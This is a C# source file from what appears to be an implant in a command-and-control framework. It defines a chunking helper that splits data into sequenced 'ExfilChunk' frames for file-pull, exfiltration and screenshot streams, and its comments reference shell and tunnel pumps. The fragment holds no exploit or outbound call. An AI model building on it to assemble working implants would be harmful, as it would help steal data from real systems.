using Rod.V1;

namespace Rod.Implant.Internal;

// Shared exfil chunking for the file.pull and exfil.push handlers
// (architecture.md Sec 10.1 exfil): one chunker, one contract. Slices a byte
// buffer into ExfilChunk frames of a fixed size, stamps the terminal flag on
// the last chunk, and numbers chunks 0-origin in stream order -- the server
// reassembles strictly by sequence and materializes the artifact on the
// terminal chunk. An empty buffer produces no chunks: an empty file is nothing
// to stream (file.pull returns it inline; exfil.push reports zero chunks),
// and the server drops empty frames.
internal static class Chunking
{
    /// <summary>
    /// The largest data payload one ExfilChunk frame carries: 512 KiB, well
    /// under the gRPC frame ceiling so a marshaled Frame still fits with room
    /// to spare. Every artifact stream -- file pull, exfil, screenshot --
    /// crosses the wire at this one ceiling so the server reassembles one
    /// shape.
    /// </summary>
    public const int StreamChunkBytes = 512 * 1024;

    /// <summary>
    /// The channel-output pump buffer: one read is one ChannelOutput chunk,
    /// so this is the largest output frame a live channel emits (16 KiB, well
    /// inside the frame-layer sizing budget with protobuf overhead to spare).
    /// The shell's stdio pump and the tunnel's socket pump share it.
    /// </summary>
    public const int ChannelOutputChunkBytes = 16 * 1024;

    public static IReadOnlyList<ExfilChunk> ChunkFile(string name, string contentType, byte[] data, int chunkSize)
    {
        var chunks = new List<ExfilChunk>();
        for (var offset = 0; offset < data.Length; offset += chunkSize)
        {
            var end = Math.Min(offset + chunkSize, data.Length);
            var slice = new byte[end - offset];
            Array.Copy(data, offset, slice, 0, slice.Length);
            chunks.Add(new ExfilChunk
            {
                Name = name,
                ContentType = contentType,
                Sequence = (ulong)chunks.Count,
                Terminal = end == data.Length,
                Data = Google.Protobuf.ByteString.CopyFrom(slice),
            });
        }
        return chunks;
    }
}
